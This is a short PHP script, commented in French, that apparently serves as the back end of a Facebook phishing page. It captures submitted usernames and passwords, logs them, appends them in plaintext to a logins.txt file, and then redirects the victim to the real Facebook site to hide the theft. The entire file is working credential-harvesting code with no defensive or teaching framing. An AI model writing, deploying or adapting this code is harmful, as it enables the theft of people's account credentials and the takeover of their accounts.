<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // Log sur terminal (si exécuté avec PHP CLI)
    error_log("Username: $username");
    error_log("Password: $password");

	file_put_contents("logins.txt", "User: $username | Pass: $password\n", FILE_APPEND);
    // Rediriger vers le vrai Facebook
    header("Location: https://www.facebook.com/profile.php");
    exit;
} else {
    echo "Accès non autorisé.";
}
?>
